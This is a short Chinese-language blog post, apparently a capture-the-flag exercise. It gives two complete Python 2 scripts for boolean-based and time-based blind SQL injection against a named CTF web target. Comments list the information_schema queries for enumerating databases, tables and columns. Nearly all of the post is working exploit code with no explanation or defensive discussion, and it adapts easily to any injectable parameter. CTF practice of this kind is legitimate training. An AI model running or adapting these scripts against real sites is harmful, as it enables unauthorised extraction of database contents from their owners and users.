---
title: Python SQL盲注脚本
tags: []
id: '562'
categories:
  - - python
date: 2018-11-30 13:31:14
---

# 基于布尔盲注

* * *

```
#!/usr/bin/env python
import requests

#dbs
#SELECT GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.SCHEMATA
#tables
#SELECT GROUP_CONCAT(table_NAME) FROM information_schema.tables where table_schema=database()
#columns
#SELECT GROUP_CONCAT(column_NAME) FROM information_schema.columns where table_name='flag'
#data
#SELECT GROUP_CONCAT(flag) FROM flag
#payload = "id=2%20and%20ascii(substr((SELECT flag FROM flag),{0},1))={1}"

flag = ''
maxlength = 30
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_!@#$%^&*()'
host = 'http://ctf.cdusec.org:8084/sqli.php?'
payload = "id=2%20and%20ascii(substr((SELECT flag FROM flag),{0},1))={1}"

for i in xrange(1, maxlength):
    for x in chars:
        url = host + payload.format(str(i), ord(x))
        # print url
        req = requests.get(url)
        if 'YES' in req.content:
            flag = flag + x
            print flag
            break
```

# 基于时间盲注

* * *

```
#!/usr/bin/env python
import requests

#dbs
#SELECT GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.SCHEMATA
#tables
#SELECT GROUP_CONCAT(table_NAME) FROM information_schema.tables where table_schema=database()
#columns
#SELECT GROUP_CONCAT(column_NAME) FROM information_schema.columns where table_name='flag'
#data
#SELECT GROUP_CONCAT(flag) FROM flag
#payload = "id=2%20and%20 if((ascii(substr((SELECT flag FROM flag),{0},1))={1}),sleep(3),NULL)"

flag = ''
maxlength = 30
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_!@#$%^&*()'
host = 'http://ctf.cdusec.org:8084/sqli.php?'
payload = "id=2%20and%20 if((ascii(substr((SELECT flag FROM flag),{0},1))={1}),sleep(3),NULL)"

for i in xrange(1, maxlength):
    for x in chars:
        url = host + payload.format(str(i), ord(x))
        # print url
        try:
            r = requests.get(url, timeout=2)
        except requests.exceptions.ReadTimeout:
            flag += x
            print flag
            break
```